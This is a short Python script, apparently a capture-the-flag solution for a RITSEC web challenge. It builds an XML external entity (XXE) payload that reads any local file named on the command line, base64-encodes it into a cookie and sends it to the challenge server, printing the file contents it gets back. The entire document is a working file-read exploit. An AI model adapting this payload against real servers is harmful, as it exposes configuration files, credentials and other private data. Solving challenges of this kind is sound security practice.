#!/usr/bin/python3
# Author: Hack.You
import requests
import sys
import base64

url = 'https://xmen-lore-web.challenges.ctf.ritsec.club/xmen'
file2read = sys.argv[1]
xxe = '''
<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE message [<!ENTITY xxe SYSTEM 'file://{file2read}'>]>
<input><xmen>&xxe;</xmen></input>
'''.format(file2read=file2read)

payload = xxe.replace('\n', '')
encoded = base64.b64encode(payload.encode())
headers = {'Cookie': 'xmen=' +  encoded.decode()}
result = requests.get(url, headers=headers)
print(result.text)
